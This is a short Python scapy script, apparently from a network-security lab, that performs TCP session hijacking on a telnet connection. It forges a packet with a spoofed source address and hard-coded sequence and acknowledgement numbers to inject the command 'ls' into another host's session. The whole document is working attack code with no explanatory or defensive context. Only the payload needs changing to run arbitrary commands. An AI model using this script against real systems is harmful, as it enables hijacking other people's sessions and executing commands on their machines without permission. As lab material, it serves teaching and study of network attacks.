from scapy.all import *
ip = IP(src="10.0.2.5", dst="10.0.2.6")
tcp = TCP(sport=32794, dport=23, flags='PA', seq=2724140328, ack=1999514736)
data = "ls"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)